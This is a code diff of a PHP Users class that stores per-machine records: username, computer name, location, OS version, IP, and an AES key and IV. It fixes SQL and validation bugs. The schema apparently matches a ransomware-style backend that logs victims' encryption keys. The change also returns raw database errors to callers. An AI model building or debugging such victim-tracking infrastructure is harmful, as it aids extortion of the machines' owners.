@@ -1,20 +1,20 @@
 <?php
 
-require_once './model.php';
+require_once 'model.php';
 
 
 class Users {
 
 
     public static function add($uuid, $username, $computername, $langId, $country, $region, $city, $latlong, $osversion, $key, $iv, $ip){
-        if (empty($uuid) || empty($username) || empty($computername) || empty($langId) || empty($country) || empty($region) || empty($city) || empty($lat) || empty($long) || empty($osversion) || empty($key) || empty($iv) || empty($ip)) {
-            return false;
+        if (empty($uuid) || empty($username) || empty($computername) || empty($langId) || empty($country) || empty($region) || empty($city) || empty($latlong) || empty($osversion) || empty($key) || empty($iv) || empty($ip)) {
+            return "empty fields";
         }
         $pdo = Model::getPdo();
         try {
             $pdo->beginTransaction();
-            $stmt = $pdo->prepare("INSERT INTO users (uuid, username, computername, langId, country, region, city, latlong, osversion, `key`, iv, ip, date, time) 
-                                    VALUES (:uuid, :username, :computername, :langId, :country, :region, :city, :latlong, :osversion, :key, :iv, :ip, CURDATE(), CURTIME()");   
+            $stmt = $pdo->prepare("INSERT INTO users (uuid, username, computername, langId, country, region, city, latlong, osversion, AESKey, iv, ip, date, time) 
+            VALUES (:uuid, :username, :computername, :langId, :country, :region, :city, :latlong, :osversion, :key, :iv, :ip, CURDATE(), CURTIME())");
             $params = array(
                 ':uuid' => $uuid, ':username' => $username,':computername' => $computername,
                 ':langId' => $langId,':country' => $country,':region' => $region,
@@ -32,7 +32,7 @@ class Users {
         } catch (PDOException $e) {
             $pdo->rollBack();
             error_log("Error adding user: " . $e->getMessage());
-            return false;
+            return $e->getMessage();
         }
     }
 
